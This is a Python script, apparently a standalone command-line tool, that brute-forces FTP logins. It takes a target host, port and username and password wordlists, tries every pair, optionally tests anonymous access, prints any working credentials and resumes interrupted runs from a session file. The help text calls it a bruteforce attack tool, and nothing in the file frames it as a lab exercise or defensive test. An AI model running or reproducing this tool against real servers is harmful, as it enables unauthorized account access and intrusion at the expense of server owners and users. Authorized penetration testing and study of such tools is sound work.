#!/usr/bin/python

import sys, pexpect, argparse, os.path
from ftplib import FTP
from os import path

def check_session():
    try:
        session = open(".session", "r")
        session.close()
        return True
    except:
        return False
		
def create_session():
    try:
        session = open(".session", "w")
        session.close()
        return True
    except:
        return False
		
def store_session(index1, index2):
    try:
        session = open(".session", "w")
        session.write(str(index1) + ":" + str(index2))
        session.close()
        return True
    except:
        return False

def restore_session():
    try:
        session = open(".session", "r")
        line = session.readline().strip().split(":")
        return int(line[0]), int(line[1])
    except Exception:
        return False

def reset_session():
    try:
        session = open(".session", "w")
        session.write("0:0")
        session.close()
        return True
    except:
        return False

def ftp_connect(host, port, usr, pwd):
    try:
        ftp = FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(usr, pwd)
        ftp.quit()
        return 0
    except Exception as e:
        err = str(e)
        if "incorrect" in err:
            return 1
        elif "established connection failed" in err:
            return 2
        else:
            print(err)
            return 3

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", help="The host you want to perform bruteforce attack", type=str, required=True)
    parser.add_argument("--port", help="The port you want to perform bruteforce attack. Leave empty to use port 21.", type=str, required=False)
    parser.add_argument("--usr", help="The wordlist path containing usernames", type=str, required=True)
    parser.add_argument("--pwd", help="The wordlist path containing passwords", type=str, required=True)
    parser.add_argument("--rst", help="Flag to reset your session file", action="store_true", required=False)
    parser.add_argument("--anon", help="Flag to try logging in anonymously too", action="store_true", required=False)
    
    args = parser.parse_args()
    host = args.host
    usr = args.usr
    pwd = args.pwd
    rst = args.rst
    anon = args.anon

    port = 21
    if args.port != None:
        port = int(args.port)

    print("Using port %d" % port)

    if not path.exists(usr):
        print("Username file path does not exist.")
        sys.exit(2)

    if not path.exists(pwd):
        print("Password file path does not exist.")
        sys.exit(2)

    if not path.isfile(usr):
        print("Username file specified is not valid.")
        sys.exit(3)

    if not path.isfile(pwd):
        print("Password file specified is not valid.")
        sys.exit(3)
        
    if rst:
        reset_session()

    if anon:
        print("Trying anonymous login...")
        if ftp_connect(host, port, "anonymous", "anonymous") == 0:
            print("Successfully found: anonymous:anonymous")
        else:
            print("Failed to login anonymously.")
    
    done = False
    pos_usr = 1
    pos_pwd = 1
    idx_usr = 0
    idx_pwd = 0
    if not check_session():
        if not create_session():
            print("Failed to create new session.")
            sys.exit(4)
    else:
        if not rst:
            print("Restoring last session.")
            pos_usr, pos_pwd = restore_session()

    u_f = open(usr, "r")
    p_f = open(pwd, "r")

    for u in u_f:
        idx_usr += 1
        if idx_usr < pos_usr:
            continue
        else:
            pos_usr = 0

        for p in p_f:
            idx_pwd += 1
            if idx_pwd < pos_pwd:
                continue
            else:
                pos_pwd = 0

            # This is where the attempt is being made
            tmp_usr = u.strip()
            tmp_pwd = p.strip()
            print("Trying: ", tmp_usr + ":" + tmp_pwd)
            result = ftp_connect(host, port, tmp_usr, tmp_pwd)
            if result == 0:
                print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
                done = True
                break
            elif  result == 2:
                while True:
                    print("Could not establish connection. Retrying...")
                    result = ftp_connect(host, port, tmp_usr, tmp_pwd)
                    if result == 0:
                        print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
                        done = True
                        break
                    elif result != 2:
                        break
                continue

            if not store_session(idx_usr, idx_pwd):
                print("Could not save current session.")
                sys.exit(4)

        if done:
            break
        p_f.seek(0)
        idx_pwd = 0

    u_f.close()
    p_f.close()

    if not done:
        print("Failed to find username and password combination.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)